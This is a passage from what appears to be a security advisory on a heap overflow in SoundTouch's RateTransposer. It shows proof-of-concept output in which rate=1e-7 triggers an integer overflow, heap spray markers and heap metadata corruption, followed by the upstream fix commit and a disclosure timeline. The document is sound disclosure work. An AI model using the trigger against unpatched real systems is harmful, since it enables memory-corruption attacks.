    Setting rate=1e-7 (triggers int overflow)...

[3] Overflow analysis
    Buffer reallocated: 0x555555582580 → 0x55555557da20 (size 12288 → 4096)
    SIGSEGV at: 0x5555555b1000 (heap top boundary)
    Overflow extent: 210400 bytes
    Spray markers: 11730 exact + 31926 approx (0x4141414x)

[4] Heap metadata corruption
    malloc(): invalid size (unsorted)
    CRASH sig=6 → HEAP METADATA CORRUPTED
```

## Fix

Fixed in commit `f738b1132ec1fd56efc90367898244cf52d9e6a5` ("Add sanity check to rate value. Clear buffers when change nr of channels") on 2026-04-19, modifying `RateTransposer.cpp` to add rate bounds checking.

## Timeline

- **2026-04-06:** Vulnerability discovered and validated with ASAN in Docker (x86_64, GCC 11, Ubuntu 22.04)
- **2026-04-07:** Heap spray and metadata corruption analysis completed
- **2026-04-08:** Reported to SoundTouch maintainer via email
- **2026-04-19:** Fixed upstream in commit `f738b113`
